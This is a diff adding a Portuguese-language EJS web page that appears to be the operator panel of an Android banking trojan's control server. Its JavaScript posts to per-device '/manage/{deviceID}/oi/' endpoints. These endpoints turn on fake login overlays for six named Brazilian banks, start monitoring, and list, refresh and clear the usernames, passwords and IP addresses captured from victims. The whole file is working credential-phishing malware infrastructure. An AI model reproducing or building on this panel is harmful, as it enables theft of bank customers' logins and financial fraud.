@@ -1,0 +1,347 @@
+<style>
+    .overlay-control {
+        margin-bottom: 20px;
+    }
+
+    .bank-buttons {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 10px;
+        margin-top: 10px;
+    }
+
+    .bank-btn {
+        padding: 8px 12px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        cursor: pointer;
+        background-color: #f5f5f5;
+        transition: all 0.3s;
+    }
+
+    .bank-btn.enabled {
+        background-color: #4CAF50;
+        color: white;
+        border-color: #45a049;
+    }
+
+    .bank-btn:hover {
+        background-color: #45a049;
+        color: white;
+    }
+
+    .credentials-table {
+        width: 100%;
+        border-collapse: collapse;
+        margin-top: 20px;
+    }
+
+    .credentials-table th,
+    .credentials-table td {
+        border: 1px solid #ddd;
+        padding: 12px;
+        text-align: left;
+    }
+
+    .credentials-table th {
+        background-color: #f2f2f2;
+        font-weight: bold;
+    }
+
+    .credentials-table tr:hover {
+        background-color: #f9f9f9;
+    }
+
+    .log-entry {
+        padding: 10px;
+        margin: 8px 0;
+        background-color: #f9f9f9;
+        border-left: 4px solid #2196F3;
+        border-radius: 4px;
+        font-size: 12px;
+    }
+
+    .log-entry.success {
+        border-left-color: #4CAF50;
+    }
+
+    .log-entry.error {
+        border-left-color: #f44336;
+    }
+
+    .log-entry .timestamp {
+        color: #666;
+        font-weight: bold;
+    }
+
+    .monitoring-status {
+        display: inline-block;
+        padding: 10px 15px;
+        border-radius: 4px;
+        margin-bottom: 15px;
+        font-weight: bold;
+    }
+
+    .monitoring-status.active {
+        background-color: #4CAF50;
+        color: white;
+    }
+
+    .monitoring-status.inactive {
+        background-color: #f44336;
+        color: white;
+    }
+</style>
+
+<div class="ui segment">
+    <h2 class="ui dividing header">
+        <i class="icon layer group"></i> Injeção de Overlays (Telas Falsas)
+    </h2>
+
+    <!-- Monitoring Status -->
+    <div id="monitoringStatus" class="monitoring-status inactive">
+        ● Monitoramento Desativado
+    </div>
+
+    <!-- Control Panel -->
+    <div class="overlay-control">
+        <h4>Controle de Monitoramento</h4>
+        <button class="ui button blue" id="enableMonitoring">
+            <i class="icon play"></i> Ativar Monitoramento
+        </button>
+        <button class="ui button grey" id="disableMonitoring">
+            <i class="icon stop"></i> Desativar Monitoramento
+        </button>
+    </div>
+
+    <!-- Bank Selection -->
+    <div class="overlay-control">
+        <h4>Bancos Habilitados para Overlay</h4>
+        <p style="font-size: 12px; color: #666;">Clique nos bancos para ativar/desativar telas falsas</p>
+        <div class="bank-buttons" id="bankButtons">
+            <!-- Will be populated by JavaScript -->
+        </div>
+    </div>
+
+    <!-- Active Overlays -->
+    <div class="overlay-control">
+        <h4>Overlays Ativos</h4>
+        <div id="activeOverlaysList" style="max-height: 300px; overflow-y: auto;">
+            <p style="color: #999; font-style: italic;">Nenhum overlay ativo no momento</p>
+        </div>
+    </div>
+
+    <!-- Captured Credentials -->
+    <div class="overlay-control">
+        <h4>Credenciais Capturadas</h4>
+        <button class="ui button red" id="clearCredentials">
+            <i class="icon trash"></i> Limpar Credenciais
+        </button>
+        <div id="credentialsList" style="max-height: 400px; overflow-y: auto; margin-top: 15px;">
+            <table class="credentials-table" id="credentialsTable">
+                <thead>
+                    <tr>
+                        <th>Aplicativo</th>
+                        <th>Usuário</th>
+                        <th>Senha</th>
+                        <th>Data/Hora</th>
+                        <th>IP</th>
+                    </tr>
+                </thead>
+                <tbody id="credentialsList">
+                    <tr>
+                        <td colspan="5" style="text-align: center; color: #999;">
+                            Nenhuma credencial capturada
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- Operation Log -->
+    <div class="overlay-control">
+        <h4>Log de Operações</h4>
+        <button class="ui button red" id="clearLog">
+            <i class="icon trash"></i> Limpar Log
+        </button>
+        <div id="operationLog" style="max-height: 400px; overflow-y: auto; margin-top: 15px;">
+            <p style="color: #999; font-style: italic;">Nenhuma operação registrada</p>
+        </div>
+    </div>
+</div>
+
+<script>
+    let overlayData = <%- JSON.stringify(pageData) %>;
+    const deviceID = '<%= deviceID %>';
+    const baseURL = '<%= baseURL %>';
+
+    const banks = ['itau', 'bradesco', 'caixa', 'nubank', 'bb', 'santander'];
+    let enabledBanks = overlayData.enabledBanks || banks;
+
+    // Initialize
+    document.addEventListener('DOMContentLoaded', function () {
+        initializeBankButtons();
+        updateUI();
+        setInterval(updateUI, 3000);
+    });
+
+    function initializeBankButtons() {
+        const container = document.getElementById('bankButtons');
+        container.innerHTML = '';
+        banks.forEach(bank => {
+            const btn = document.createElement('button');
+            btn.className = 'bank-btn' + (enabledBanks.includes(bank) ? ' enabled' : '');
+            btn.textContent = bank.toUpperCase();
+            btn.onclick = () => toggleBank(bank);
+            container.appendChild(btn);
+        });
+    }
+
+    function toggleBank(bank) {
+        const isEnabled = enabledBanks.includes(bank);
+        const endpoint = isEnabled ? `/manage/${deviceID}/oi/disable_bank/${bank}` : `/manage/${deviceID}/oi/enable_bank/${bank}`;
+        
+        fetch(endpoint, { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                if (!data.error) {
+                    if (isEnabled) {
+                        enabledBanks = enabledBanks.filter(b => b !== bank);
+                    } else {
+                        enabledBanks.push(bank);
+                    }
+                    initializeBankButtons();
+                    showNotification('Banco ' + bank + ' ' + (isEnabled ? 'desativado' : 'ativado'), 'success');
+                } else {
+                    showNotification('Erro: ' + data.error, 'error');
+                }
+            });
+    }
+
+    document.getElementById('enableMonitoring').addEventListener('click', function () {
+        fetch(`/manage/${deviceID}/oi/enable_monitoring`, { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                if (!data.error) {
+                    overlayData.monitoringEnabled = true;
+                    updateUI();
+                    showNotification('Monitoramento ativado', 'success');
+                }
+            });
+    });
+
+    document.getElementById('disableMonitoring').addEventListener('click', function () {
+        fetch(`/manage/${deviceID}/oi/disable_monitoring`, { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                if (!data.error) {
+                    overlayData.monitoringEnabled = false;
+                    updateUI();
+                    showNotification('Monitoramento desativado', 'success');
+                }
+            });
+    });
+
+    document.getElementById('clearCredentials').addEventListener('click', function () {
+        if (confirm('Tem certeza que deseja limpar todas as credenciais capturadas?')) {
+            fetch(`/manage/${deviceID}/oi/credentials`, { method: 'DELETE' })
+                .then(r => r.json())
+                .then(data => {
+                    if (!data.error) {
+                        overlayData.capturedCredentials = [];
+                        updateUI();
+                        showNotification('Credenciais limpas', 'success');
+                    }
+                });
+        }
+    });
+
+    document.getElementById('clearLog').addEventListener('click', function () {
+        if (confirm('Tem certeza que deseja limpar o log de operações?')) {
+            fetch(`/manage/${deviceID}/oi/log`, { method: 'DELETE' })
+                .then(r => r.json())
+                .then(data => {
+                    if (!data.error) {
+                        overlayData.overlayLog = [];
+                        updateUI();
+                        showNotification('Log limpo', 'success');
+                    }
+                });
+        }
+    });
+
+    function updateUI() {
+        fetch(`/manage/${deviceID}/oi/log`)
+            .then(r => r.json())
+            .then(data => {
+                if (!data.error) {
+                    overlayData = data.data;
+                    updateMonitoringStatus();
+                    updateActiveOverlays();
+                    updateCredentials();
+                    updateLog();
+                }
+            });
+    }
+
+    function updateMonitoringStatus() {
+        const status = document.getElementById('monitoringStatus');
+        if (overlayData.monitoringEnabled) {
+            status.textContent = '● Monitoramento Ativo';
+            status.classList.remove('inactive');
+            status.classList.add('active');
+        } else {
+            status.textContent = '● Monitoramento Desativado';
+            status.classList.remove('active');
+            status.classList.add('inactive');
+        }
+    }
+
+    function updateActiveOverlays() {
+        const container = document.getElementById('activeOverlaysList');
+        if (overlayData.activeOverlays && overlayData.activeOverlays.length > 0) {
+            container.innerHTML = overlayData.activeOverlays.map(overlay => `
+                <div class="log-entry">
+                    <strong>${overlay.appName}</strong> (${overlay.packageName})<br>
+                    <span class="timestamp">Iniciado: ${new Date(overlay.startTime).toLocaleString('pt-BR')}</span>
+                </div>
+            `).join('');
+        } else {
+            container.innerHTML = '<p style="color: #999; font-style: italic;">Nenhum overlay ativo no momento</p>';
+        }
+    }
+
+    function updateCredentials() {
+        const tbody = document.getElementById('credentialsList');
+        if (overlayData.capturedCredentials && overlayData.capturedCredentials.length > 0) {
+            tbody.innerHTML = overlayData.capturedCredentials.map(cred => `
+                <tr>
+                    <td>${cred.appName || 'N/A'}</td>
+                    <td><code>${cred.username || 'N/A'}</code></td>
+                    <td><code style="color: #f44336;">●●●●●●●●</code></td>
+                    <td>${new Date(cred.timestamp).toLocaleString('pt-BR')}</td>
+                    <td>${cred.ipAddress || 'N/A'}</td>
+                </tr>
+            `).join('');
+        } else {
+            tbody.innerHTML = '<tr><td colspan="5" style="text-align: center; color: #999;">Nenhuma credencial capturada</td></tr>';
+        }
+    }
+
+    function updateLog() {
+        const container = document.getElementById('operationLog');
+        if (overlayData.overlayLog && overlayData.overlayLog.length > 0) {
+            container.innerHTML = overlayData.overlayLog.slice().reverse().map(log => `
+                <div class="log-entry ${log.success ? 'success' : 'error'}">
+                    <span class="timestamp">${new Date(log.timestamp).toLocaleString('pt-BR')}</span>
+                    <strong>${log.action}</strong> - ${log.appName || 'N/A'} (${log.packageName || 'N/A'})<br>
+                    Status: <span style="color: ${log.success ? '#4CAF50' : '#f44336'};">${log.success ? '✓ Sucesso' : '✗ Falha'}</span><br>
+                    Detalhes: ${log.details || 'N/A'}
+                </div>
+            `).join('');
+        } else {
+            container.innerHTML = '<p style="color: #999; font-style: italic;">Nenhuma operação registrada</p>';
+        }
+    }
+</script>
